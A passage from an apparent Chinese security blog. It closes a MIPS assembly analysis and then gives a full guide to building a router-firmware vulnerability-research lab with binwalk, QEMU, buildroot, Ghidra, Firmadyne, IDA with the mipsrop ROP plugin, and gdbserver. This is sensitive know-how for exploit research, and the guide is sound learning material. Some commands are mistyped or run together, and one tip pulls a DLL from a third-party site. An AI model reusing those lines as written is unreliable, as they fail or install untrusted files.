<p>s1=3第四个状态，比较s2 = 0x42e048中0x14处的内容是不是’uid’。不是则跳过该字符，并且s1=0重新开始。如果s2 = 0x42e048中0x14处的内容是’uid’。则通过sobj_get_string()将s3中0x14处堆的字符串地址作为返回值给v0。   </p>
<p>之后通过sobj_add_string()将v0的内容给s6的0x14处。到此完成了uid中的内容的获取。最后就是利用sobj_del()将s2、s3中的内容给释放并清空。   </p>
<p>函数返回时，uid的内容存储在之前sobj_new()的结构体s5=0x42e008的0x14处。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实这算第一次这样仔细的阅读并调试汇编源码（虽然还是借助了ghidra的反汇编功能进行理解），还是太菜了呀，整个过程还是花了挺多时间的，但现在看来感觉还是挺值的，因为整个流程下来我对MIPS汇编代码理解以及寄存器的运用还有gdb、IDA的联调有了相对熟练的掌握，为以后静态和动态分析开一个好头吧！然后这篇文章的目的也是为了整理梳理整个思路然后以文字的形式记录下来。</p>
]]></content>
  </entry>
  <entry>
    <title>路由器漏洞挖掘环境搭建</title>
    <url>/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/</url>
    <content><![CDATA[<h1 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h1><p>因为利用apt-get安装binwalk会缺少很多依赖项所以还是建议根据 <a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md" target="_blank" rel="noopener">https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md</a> </p>
<pre class=" language-shell"><code class="language-shell">git clone https://github.com/ReFirmLabs/binwalk.git
cd binwalk
# 对于Debian/Ubuntu的用户而言，很多依赖项都可以通过deps.sh安装
sudo ./deps.sh
sudo python ./setup.py install</code></pre>
<p> 下载源代码自己编译 </p>
<pre class=" language-shell"><code class="language-shell">sudo apt-get install git build-essential autoconfsudo 
git clone https://github.com/devttys0/binwalk.git
sudo apt-get install libqt4-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip
sudo pip install pyqtgraph
sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
git clone https://github.com/devttys0/sasquatchcd sasquatch && sudo make && sudo make install
sudo python setup.py install</code></pre>
<h1 id="安装sasquatch"><a href="#安装sasquatch" class="headerlink" title="安装sasquatch"></a>安装sasquatch</h1><p>一般现在binwalk完全安装时会自动带上这个sasquatch，输入这三条命令就可以了 </p>
<pre class=" language-text"><code class="language-text">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
sudo git clone https://github.com/devttys0/sasquatch
cd sasquatch && sudo make && sudo make install</code></pre>
<h1 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h1><h2 id="qemu安装"><a href="#qemu安装" class="headerlink" title="qemu安装"></a>qemu安装</h2><p>下面安装qemu的步骤参照知世师傅的<a href="[https://nightrainy.github.io/2019/11/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](https://nightrainy.github.io/2019/11/04/路由器破解初探之环境搭建/)">博客内容</a></p>
<ol>
<li>直接安装qemu，直接使用系统提供的版本，ubuntu16.04一般是qemu2.5</li>
</ol>
<pre class=" language-shell"><code class="language-shell">sudo apt install libglib2.0-dev libgcrypt20-dev autoconf automake libtool 
sudo apt-get install libglib2.0 libglib2.0-dev
sudo apt install -y pkg-config
sudo apt install -y libpixman-1-dev
sudo apt install -y libfdt-dev
sudo apt install libsdl2-dev  
sudo apt install libsnappy-dev
sudo apt install libgtk-3-dev
sudo apt install libjpeg-turbo8-dev
sudo apt install libcurl4-openssl-dev
sudo apt install libspice-server-dev
sudo apt-get install qemu 
sudo apt-get install qemu-user-static
sudo apt-get install qemu-system</code></pre>
<ol start="2">
<li><p>自己编译</p>
<ol>
<li><p>git </p>
<pre class=" language-sh"><code class="language-sh">git clone git://git.qqmu-project.org/qemu.git/qemu.git
git submodule update --init pixman
git submodule update --init dtc
sudo apt install libglib2.0-dev libgcrypt20-dev autoconf automake libtool 
sudo apt-get install libglib2.0 libglib2.0-dev
sudo apt install -y pkg-config
sudo apt install -y libpixman-1-dev
sudo apt install -y libfdt-dev
sudo apt install libsdl2-dev  
sudo apt install libsnappy-dev
sudo apt install libgtk-3-dev
sudo apt install libjpeg-turbo8-dev
sudo apt install libcurl4-openssl-dev
sudo apt install libspice-server-dev
sudo ./configure --static && sudo make -j8 && sudo make install
注: 使用configure 使用static参数的时候,依赖可能会根据不同环境导致依赖缺失,可以根据报错来解决依赖问题
</code></pre>
</li>
<li><p>wget</p>
<p> 可根据需求不同来选择不同的版本 </p>
<pre class=" language-sh"><code class="language-sh">sudo apt install libglib2.0-dev libgcrypt20-dev autoconf automake libtool 
sudo apt-get install libglib2.0 libglib2.0-dev
sudo apt install -y pkg-config
sudo apt install -y libpixman-1-dev
sudo apt install -y libfdt-dev
sudo apt install libsdl2-dev  
sudo apt install libsnappy-dev
sudo apt install libgtk-3-dev
sudo apt install libjpeg-turbo8-dev
sudo apt install libcurl4-openssl-dev
sudo apt install libspice-server-dev
sudo arm-softmmu
wget https://download.qemu.org/qemu-4.1.0.tar.xz
tar xvJf qemu-4.1.0.tar.xz
cd qemu-4.1.0
sudo ./configure --target-list=arm-softmmu,mips-softmmu,mipsel-softmmu --audio-drv-list=alsa,pa
sudo make -j8
sudo make install</code></pre>
</li>
<li><p>这里贴出官方的安装教程</p>
<ol>
<li><p>To download and build QEMU 4.1.0:</p>
<pre class=" language-shell"><code class="language-shell">wget https://download.qemu.org/qemu-4.1.0.tar.xz
tar xvJf qemu-4.1.0.tar.xz
cd qemu-4.1.0
./configure
make</code></pre>
</li>
<li><p>To download and build QEMU from git:</p>
<pre class=" language-shell"><code class="language-shell">git clone https://git.qemu.org/git/qemu.git
cd qemu
git submodule init
git submodule update --recursive
./configure
make</code></pre>
</li>
<li><p>Debian/Ubuntu:</p>
<pre class=" language-sh"><code class="language-sh">apt-get install qemu</code></pre>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="qemu网络配置"><a href="#qemu网络配置" class="headerlink" title="qemu网络配置"></a>qemu网络配置</h2><pre class=" language-shell"><code class="language-shell">sudo apt-get install bridge-utils #虚拟网桥工具
sudo apt-get install uml-utilities # UML（User-mode linux）工具</code></pre>
<p><code>sudo vi /etc/network/interfaces</code></p>
<p>写入下面的内容：</p>
<pre class=" language-shell"><code class="language-shell"># interfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback
auto ens33
iface ens33 inet manual
up ifconfig ens33 0.0.0.0 up
auto br0
iface br0 inet dhcp
  bridge_ports ens33
  bridge_maxwait 0</code></pre>
<p>改完之后要重启网卡才能生效：</p>
<p><code>sudo /etc/init.d/networking  restart</code></p>
<p> 配置 qemu 虚拟机的网卡信息： </p>
<p><code>sudo vi /etc/qemu-ifup</code></p>
<p> 将原来的内容注释，换成下面的内容： </p>
<pre class=" language-shell"><code class="language-shell">#! /bin/sh
echo "Executing /etc/qemu-ifup"
echo "bridge networking"
echo "Bringing up $1 for bridge mode"
sudo /sbin/ifconfig $1 0.0.0.0 promisc up
echo "Adding $1 to br0"
sudo /sbin/brctl addif br0 $1
sleep 3</code></pre>
<h2 id="qemu-mips对应包下载"><a href="#qemu-mips对应包下载" class="headerlink" title="qemu-mips对应包下载"></a>qemu-mips对应包下载</h2><p>从 <a href="https://people.debian.org/~aurel32/qemu/mips/下载对应的debian" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/mips/下载对应的debian</a> mips qemu镜像  </p>
<p><img src="mips_qemu.png" alt=""></p>
<p>选择debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta.   </p>
<p>使用qemu系统模式加载之前下载的内核：qemu-system-mips对于mips的镜像。</p>
<pre class=" language-shell"><code class="language-shell">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap</code></pre>
<p>可以看到一个qemu虚拟机，用root/root登录进去：   </p>
<p><img src="qemu_mips%E8%99%9A%E6%8B%9F%E6%9C%BA.png" alt=""></p>
<p><code>nano /etc/network/interfaces</code>将网卡eth0改为eth1：  </p>
<p><code>/etc/init.d/networking restart</code>看是否配置成功，不然可以重启qemu试试是否自动配置好了eth1的网卡信息。 </p>
<p>进去虚拟机之后，如果发现只有网卡的其他信息、没有 IP 地址，<strong>可以手动配置一下 eth1 网卡的 IP</strong>：</p>
<pre class=" language-sh"><code class="language-sh">ifconfig eth1 192.168.91.130/24 #跟宿主机在同一个网段内</code></pre>
<p>之后ping一下外面的主机看看是否联通。宿主机也可以通过ssh <a href="mailto:root@192.168.91.130">root@192.168.91.130</a>远程登陆进去。</p>
<p>以后的文章可能会细讲，qemu的网络配置和通信。</p>
<h1 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h1><ol>
<li><p>下载buildroot安装包（我这里选了一个2019.02版本）</p>
<pre class=" language-shell"><code class="language-shell">wget http://buildroot.net/downloads/buildroot-2019.02.tar.gz
或者直接从http://buildroot.net/downloads/下载</code></pre>
</li>
<li><p>解压安装包</p>
<pre class=" language-shell"><code class="language-shell">tar -zxvf buildroot-2019.02.tar.gz</code></pre>
</li>
<li><p>进入安装包，配置   </p>
<pre class=" language-shell"><code class="language-shell">cd buildroot-2019.02 && make clean && make menuconfig</code></pre>
</li>
<li><p>进入配置界面</p>
<p><img src="%E9%85%8D%E7%BD%AE%E7%95%8C%E9%9D%A2.png" alt=""></p>
<p>首先根据想要调试的目标架构进行配置Target options，我因为要调试mips小端架构，所以选择如下： </p>
<p><img src="target_options.png" alt="">  </p>
<p>Build options选择默认就好，进入Toolchain进入配置</p>
<p>C library选择uClibc-ng，因为二进制文件是使用此库编译的，所以大多数设备都是用此C库</p>
<p><img src="c_library.png" alt=""></p>
<p>其中的kernel Headers根据查看ubantu操作系统内核进行选择 </p>
<p><code>uname -a</code></p>
<p><img src="uname_a.png" alt=""></p>
<p>选择Manually specified然后找到4.15.x并选择</p>
<p><img src="kernel_head.png" alt=""></p>
<p>gcc 版本选择</p>
<p><code>gcc -v</code></p>
<p><img src="gcc-.png" alt=""></p>
<p>选择gcc 5.x   </p>
<p><img src="gcc-%E9%80%89%E6%8B%A9.png" alt=""></p>
<p>最后启用“为主机启用交叉编译的gdb”按Y选中,括号内会有*号。   </p>
<p><img src="gdb%E9%80%89%E6%8B%A9.png" alt=""></p>
<p>最后<code>sudo make -j8</code> </p>
</li>
<li><p>配置环境变量</p>
<p>在/etc/profile文件中加入</p>
<p><code>export PATH=$PATH:/home/yourname/buildroot-2019.02.2/output/host/bin</code></p>
<p>最后<code>source /etc/profile</code></p>
</li>
<li><p>检验是否能编译生成mipsel文件</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"demo\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>利用<code>mipsel-linux-gcc demo.c -static -o demo</code>得到是小端文件，并且能直接运行。</p>
<pre class=" language-shell"><code class="language-shell"> ~/Desktop/IoT :  mipsel-linux-gcc demo.c -static -o demo
 ~/Desktop/IoT :  file demo
demo: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</code></pre>
<p>如果没有加<code>-static</code>将需要动态链接库</p>
<p><img src="%E9%9C%80%E8%A6%81%E9%93%BE%E6%8E%A5%E5%BA%93.png" alt=""></p>
<p>这时我们只需要找到该库，使用<code>qemu-mipsel -L /Your_Path/buildroot/output/target/ hello</code>即可运行。 </p>
</li>
</ol>
<h1 id="Ghidra"><a href="#Ghidra" class="headerlink" title="Ghidra"></a>Ghidra</h1><p> Ghidra是由美国国家安全局（NSA）研究部门开发的软件逆向工程（SRE）套件，用于支持网络安全任务。  该反汇编工具类似于我们常用的IDA，不过其基于JAVA开发，是一款适用于Windows、Mac和Linux的跨平台反汇编工具，用户还可以使用Java或Python开发自己的Ghidra插件或者脚本。 </p>
<h2 id="安装条件"><a href="#安装条件" class="headerlink" title="安装条件"></a>安装条件</h2><p>硬件条件:4GB内存;1GB硬盘空间</p>
<p>软件条件:Java 11+</p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>百度盘下载地址：<a href="https://pan.baidu.com/s/1zHWilk5NiTuzDItQhI8nnQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1zHWilk5NiTuzDItQhI8nnQ</a> （提取码 ：8upz） </p>
<p>github地址： <a href="https://github.com/NationalSecurityAgency/Ghidra" target="_blank" rel="noopener">https://github.com/NationalSecurityAgency/Ghidra</a> </p>
<p>项目主页： <a href="https://Ghidra-sre.org" target="_blank" rel="noopener">https://Ghidra-sre.org</a> 可以直接从上面下载最新的ghidra</p>
<p><a href="https://www.secrss.com/articles/8829" target="_blank" rel="noopener">NSA开源逆向工具Ghidra入门使用教程</a></p>
<p>在Ubuntu16.04中同样可以建立一个软链接进行快捷键启动。</p>
<pre class=" language-sh"><code class="language-sh">ln -s /home/yourname/project/ghidra_9.1.2_PUBLIC_20200212/ghidra_9.1.2_PUBLIC/ghidraRun /usr/bin/ghidra</code></pre>
<h2 id="Ghidra插件使用"><a href="#Ghidra插件使用" class="headerlink" title="Ghidra插件使用"></a>Ghidra插件使用</h2><p>可以学习Freebuf上平安银河实验室提供的免费<a href="https://live.freebuf.com/detail/719e1138a016a5bffbfe0daeb4533b4f" target="_blank" rel="noopener">公开课</a>，然后其中的插件可以参照平安银河实验室写的Ghidra_scripts<a href="https://github.com/PAGalaxyLab/ghidra_scripts" target="_blank" rel="noopener">https://github.com/PAGalaxyLab/ghidra_scripts</a> </p>
<h1 id="Firmadyne"><a href="#Firmadyne" class="headerlink" title="Firmadyne"></a>Firmadyne</h1><p>Firmadyne是一个基于qemu的Linux嵌入式系统自动仿真工具。利用它可以主要可以模拟路由器固件的运行。它拥有自己自己预编译好的mips架构Linux内核。</p>
<p>github传送门： <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a> 里面有详细的安装和使用说明。</p>
<p>也可以参考这篇帖子进行安装使用： <a href="https://chuansongme.com/n/1009525252762" target="_blank" rel="noopener">https://chuansongme.com/n/1009525252762</a> </p>
<p>到此环境差不多安装完了。</p>
<p>安装完成之后，可以自己编写脚本来批量化手工的操作，这里修改了知世师傅的一个<a href="https://github.com/nightRainy/Auxiliary_tools/blob/master/iot/fastrun.py" target="_blank" rel="noopener">脚本</a>。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> pexpect
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> glob

passd<span class="token operator">=</span><span class="token string">"firmadyne"</span>

<span class="token keyword">def</span> <span class="token function">myinit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"[+]Usage:sudo ./fastrun.py xxx.bin"</span><span class="token punctuation">)</span> 
    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"[+]Please input the right file name"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">fake_extractor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step1:extracting now ..."</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'&amp;&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">)</span>
    extractor_cmd<span class="token operator">=</span><span class="token string">"sudo ./sources/extractor/extractor.py -b dlink -sql 127.0.0.1 -np -nk "</span> <span class="token operator">+</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token string">" images"</span>
    <span class="token comment" spellcheck="true">#extractor_cmd="sudo ./sources/extractor/extractor.py -b linksys -sql 127.0.0.1 -np -nk " +sys.argv[1] +" images"</span>
    <span class="token comment" spellcheck="true">#extractor_cmd="sudo ./sources/extractor/extractor.py -b netgear -sql 127.0.0.1 -np -nk " +sys.argv[1] +" images"</span>
    child <span class="token operator">=</span> pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>extractor_cmd<span class="token punctuation">,</span> timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    child<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token string">"Database Image ID: "</span><span class="token punctuation">)</span>
    image_id <span class="token operator">=</span> child<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    child<span class="token punctuation">.</span>expect<span class="token punctuation">(</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span>
    <span class="token keyword">return</span> image_id

<span class="token keyword">def</span> <span class="token function">get_arch</span><span class="token punctuation">(</span>image_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step2:getting arch now..."</span><span class="token punctuation">)</span>
    get<span class="token operator">=</span><span class="token string">"sudo ./scripts/getArch.sh ./images/"</span> <span class="token operator">+</span> image_id <span class="token operator">+</span> <span class="token string">".tar.gz "</span>
    arch<span class="token operator">=</span> pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>get<span class="token punctuation">,</span>timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    index<span class="token operator">=</span>arch<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"firmadyne:"</span><span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]sendline password"</span><span class="token punctuation">)</span>
        arch<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>passd<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        arch<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">'[+]get arch failed!'</span><span class="token punctuation">)</span>
    arch<span class="token punctuation">.</span>expect<span class="token punctuation">(</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Done!"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">make_images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step3:making image now"</span><span class="token punctuation">)</span>
    make<span class="token operator">=</span><span class="token string">'sudo ./scripts/makeImage.sh '</span> <span class="token operator">+</span> image_id
    images<span class="token operator">=</span>pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>make<span class="token punctuation">,</span>timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    index<span class="token operator">=</span>images<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"firmadyne:"</span><span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>index<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]sendline password"</span><span class="token punctuation">)</span>
        images<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>passd<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        images<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"[+]make images failed!"</span><span class="token punctuation">)</span>
    images<span class="token punctuation">.</span>expect<span class="token punctuation">(</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Done!"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">set_net</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step4:Setting inferNetwork now"</span><span class="token punctuation">)</span>
    myset<span class="token operator">=</span><span class="token string">"sudo ./scripts/inferNetwork.sh "</span> <span class="token operator">+</span> image_id
    net<span class="token operator">=</span>pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>myset<span class="token punctuation">,</span>timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    index<span class="token operator">=</span>net<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"firmadyne"</span><span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>index<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]sendline password"</span><span class="token punctuation">)</span>
        net<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>passd<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        net<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"[+]make images failed!"</span><span class="token punctuation">)</span>
    net<span class="token punctuation">.</span>expect<span class="token punctuation">(</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Done!"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step5:Running now!"</span><span class="token punctuation">)</span>
    myrun<span class="token operator">=</span><span class="token string">"sudo ./scratch/"</span> <span class="token operator">+</span> image_id <span class="token operator">+</span> <span class="token string">"/run.sh"</span>
    index<span class="token operator">=</span>pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>myrun<span class="token punctuation">,</span>timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    index<span class="token punctuation">.</span>interact<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Done!"</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    myinit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    image_id <span class="token operator">=</span> fake_extractor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    get_arch<span class="token punctuation">(</span>image_id<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#bytes to strings</span>
    make_images<span class="token punctuation">(</span><span class="token punctuation">)</span>
    set_net<span class="token punctuation">(</span><span class="token punctuation">)</span>
    run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h1 id="IDA及其插件"><a href="#IDA及其插件" class="headerlink" title="IDA及其插件"></a>IDA及其插件</h1><p>如果想把IDA直接安装在linux中需要安装wine， 工作目录在~/.wine。 </p>
<h2 id="wine安装和使用"><a href="#wine安装和使用" class="headerlink" title="wine安装和使用"></a>wine安装和使用</h2><pre class=" language-sh"><code class="language-sh">sudo apt-get install wine</code></pre>
<h2 id="wine中安装使用IDA"><a href="#wine中安装使用IDA" class="headerlink" title="wine中安装使用IDA"></a>wine中安装使用IDA</h2><p>直接安装或者将安装好的IDA整个包拖进ubuntu16.04，然后用<code>wine idaq.exe</code>就能启动起来，但是会出现缺少python27.dll</p>
<pre class=" language-text"><code class="language-text">module:import_dll Loading library python27.dll (which is needed by L"Z:\\home\\anciety\\ida\\plugins\\python.plw") failed (error c000007b).</code></pre>
<p>在宿主机找到该文件并放在IDA的根目录下，还是出现同样的问题，网上还说从<a href="https://www.dllme.com/dll/files/python27_dll.html下载一个python27.dll放在IDA根目录下，但是之后再启动，会出现`IDAPython" target="_blank" rel="noopener">https://www.dllme.com/dll/files/python27_dll.html下载一个python27.dll放在IDA根目录下，但是之后再启动，会出现`IDAPython</a>: importing “site” failed<code>问题， 解决方法就是需要设置一个环境变量，如果在</code>/usr/bin`下写了一个脚本来启动ida，那么解决方法比较简单，也不会影响linux，否则如果直接设置环境变量会影响linux的python运行。 </p>
<p>脚本:</p>
<pre class=" language-shell"><code class="language-shell">#!/bin/bash
export PYTHONPATH=/usr/lib/python2.7 && wine yourpath/idaq.exe</code></pre>
<p>如果上面方法还是报错，网上找到解决方案是在wine里面重新安装python2.7。</p>
<pre class=" language-sh"><code class="language-sh">curl -O https://www.python.org/ftp/python/2.7.15/python-2.7.15.msi
wine msiexec /i python-2.7.15.msi</code></pre>
<p>解决上述问题之后，写一个快捷命令启动脚本idaq</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
wine yourpath/idaq.exe</code></pre>
<p>之后建立一个软连接以方便在任何窗口输入idaq迅速启动</p>
<pre class=" language-sh"><code class="language-sh">ln -s pathof上面的快捷脚本 /usr/bin/idaq</code></pre>
<p>同样给idaq64.exe建立一个启动脚本和软连接。</p>
<h2 id="安装keypatch-py插件"><a href="#安装keypatch-py插件" class="headerlink" title="安装keypatch.py插件"></a>安装keypatch.py插件</h2><p>主要问题是安装keystone, 在<a href="http://www.keystone-engine.org/download/" target="_blank" rel="noopener">http://www.keystone-engine.org/download/</a> 下载32位keystone-0.9.1-python-win32.msi下载并安装，应该能使用keypatch.py插件，但是有时还是会爆出缺少msvcp120.dll和msvcr120.dll动态链接库的问题，直接在主机找到并复制到IDA根目录就能解决。</p>
<p>还有很多运行错误包括缺少DLL都可以从本机找到放进IDA根目录解决，其他运行错误根据提示进行相应的解决。</p>
<h2 id="安装mipsrop等插件"><a href="#安装mipsrop等插件" class="headerlink" title="安装mipsrop等插件"></a>安装mipsrop等插件</h2><p>安装mipsrop插件，以方便IDA调试，现在支持IDA7.0+</p>
<pre class=" language-text"><code class="language-text">https://github.com/devttys0/ida/tree/master/plugins/mipsrop</code></pre>
<p>把下载的ida/plugins目录下所有后缀为:,py“d的文件复制到IDA pro插件目录：</p>
<pre class=" language-sh"><code class="language-sh">sudo cp –r `find /home/yale/a/ida/plugins –iname *.py` /home/yale/ida/ida/plugins/</code></pre>
<p>将scrpit复制到idapro根目录下</p>
<pre class=" language-text"><code class="language-text">sudo mkdir /home/yale/ida/ida/plugins/scripts
sudo cp –r ida/scripts ida/scripts/</code></pre>
<p>下载之后放在ida的plugins中，我本机用的IDA7.1，wine虚拟机用的IDA6.8都能正常使用</p>
<p><img src="mipsrop.png" alt=""></p>
<p>也有师傅改了之前的mipsrop以支持IDA6.x和IDA7.x</p>
<pre class=" language-text"><code class="language-text">https://github.com/fuzzywalls/ida</code></pre>
<h1 id="gdbserver和gdb"><a href="#gdbserver和gdb" class="headerlink" title="gdbserver和gdb"></a>gdbserver和gdb</h1><p>可以从以下链接下载已经编译好的gdbsever</p>
<p><a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a> </p>
<p>自行编译，参考<a href="https://www.cnblogs.com/cslunatic/p/3635520.html" target="_blank" rel="noopener">文章</a></p>
<pre class=" language-sh"><code class="language-sh">下载完后，进入/opt/目录，配置编译步骤如下：
#tar jxvf gdb-8.1-tar-bz2
